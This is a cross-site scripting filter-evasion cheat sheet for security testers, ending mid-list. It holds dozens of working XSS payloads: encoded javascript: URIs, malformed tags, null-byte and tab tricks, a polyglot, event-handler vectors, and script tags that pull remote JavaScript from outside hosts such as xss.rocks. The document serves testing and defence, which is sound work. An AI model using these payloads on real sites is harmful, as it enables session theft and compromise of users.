
## Tests

This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.

### Basic XSS Test Without Filter Evasion

This attack, which uses normal XSS JavaScript injection, serves as a baseline for the cheat sheet (the quotes are not required in any modern browser so they are omitted here):

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```

### XSS Locator (Polyglot)

This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).

### Malformed A Tags

This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:

```js
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

(Submitted by David Cross, Verified on Chrome)

### Malformed IMG Tags

This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)

### fromCharCode

If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```

### Default SRC Tag to Get Past Filters that Check SRC Domain

This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

(Submitted by David Cross and edited by Abdullah Hussam)

### Default SRC Tag by Leaving it Empty

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### Default SRC Tag by Leaving it out Entirely

```html
<IMG onmouseover="alert('xxs')">
```

### On Error Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror and JavaScript Alert Encode

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Decimal HTML Character References

Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:

```html

 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

### Decimal HTML Character References Without Trailing Semicolons

This is often effective in bypassing XSS filters that look for the string `&\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```

### Hexadecimal HTML Character References Without Trailing Semicolons

This attack is also viable against the filter for the string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

### Embedded Tab

This approach breaks up the XSS attack:

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```
<!-- markdownlint-enable MD010-->

### Embedded Encoded Tab

This approach can also break up XSS:

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```

### Embedded Newline to Break Up XSS

While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```

#### Example 1: Break Up XSS Attack with Embedded Carriage Return

(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

#### Example 2: Break Up JavaScript Directive with Null

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS

This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

#### Example 4: Non-alpha-non-digit XSS

The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### Extraneous Open Brackets

This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

(Submitted by Franz Sedlmaier)

### No Closing Script Tags

With Firefox, you don't actually need the `\></SCRIPT>` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### Protocol Resolution in Script Tags

This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:

```html
<SCRIPT SRC=//xss.rocks/.j>
```

(Submitted by Łukasz Pilorz)

### Half Open HTML/JavaScript XSS Vector

Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn't require the end `\>`. As a side note, this was also affective against a real world XSS filter using an open ended `<IFRAME` tag instead of an `<IMG` tag.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

### Escaping JavaScript Escapes

If an application is written to output some user information inside of a JavaScript (like the following: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:

```js
\";alert('XSS');//
```

An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

```js
</script><script>alert('XSS');</script>
```

### End Title Tag

This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

#### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

### List-style-image

This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### VBscript in an Image

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### SVG Object Tag

```js
<svg/onload=alert('XSS')>
```

### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

### BODY Tag

This attack doesn't require using any variants of `javascript:` or `<SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):

```html
<BODY ONLOAD=alert('XSS')>
```

#### Attacks Using Event Handlers

The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.

The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).

- `onAbort()` (when user aborts the loading of an image)
- `onActivate()` (when object is set as the active element)
- `onAfterPrint()` (activates after user prints or previews print job)
- `onAfterUpdate()` (activates on data object after updating data in the source object)
- `onBeforeActivate()` (fires before the object is set as the active element)
- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
- `onBeforeUpdate()` (activates on data object before updating data in the source object)
- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
- `onBlur()` (in the case where another popup is loaded and window looses focus)
- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
- `onCellChange()` (fires when data changes in the data provider)
- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
- `onClick()` (someone clicks on a form)
- `onContextMenu()` (user would need to right click on attack area)
- `onControlSelect()` (fires when the user is about to make a control selection of the object)
- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
- `onDblClick()` (user double-clicks a form element or a link)
- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
- `onDrag()` (requires that the user drags an object)
- `onDragEnd()` (requires that the user drags an object)
- `onDragLeave()` (requires that the user drags an object off a valid location)
- `onDragEnter()` (requires that the user drags an object into a valid location)
- `onDragOver()` (requires that the user drags an object into a valid location)
- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
- `onDragStart()` (occurs when user starts drag operation)
- `onDrop()` (user drops an object (e.g. file) onto the browser window)
- `onEnd()` (the onEnd event fires when the timeline ends.
- `onError()` (loading of a document or image causes an error)
- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
- `onFilterChange()` (fires when a visual filter completes state change)
- `onFinish()` (attacker can create the exploit when marquee is finished looping)
- `onFocus()` (attacker executes the attack string when the window gets focus)
- `onFocusIn()` (attacker executes the attack string when window gets focus)
- `onFocusOut()` (attacker executes the attack string when window looses focus)
- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
- `onInput()` (the text content of an element is changed through the user interface)
- `onKeyDown()` (user depresses a key)
- `onKeyPress()` (user presses or holds down a key)
- `onKeyUp()` (user releases a key)
- `onLayoutComplete()` (user would have to print or print preview)
- `onLoad()` (attacker executes the attack string after the window loads)
- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
- `onMessage()` (fire when the document received a message)
- `onMouseDown()` (the attacker would need to get the user to click on an image)
- `onMouseEnter()` (cursor moves over an object or area)
- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseOver()` (cursor moves over an object or area)
- `onMouseUp()` (the attacker would need to get the user to click on an image)
- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
- `onMove()` (user or attacker would move the page)
- `onMoveEnd()` (user or attacker would move the page)
- `onMoveStart()` (user or attacker would move the page)
- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
- `onPopState()` (fires when user navigated the session history)
- `o
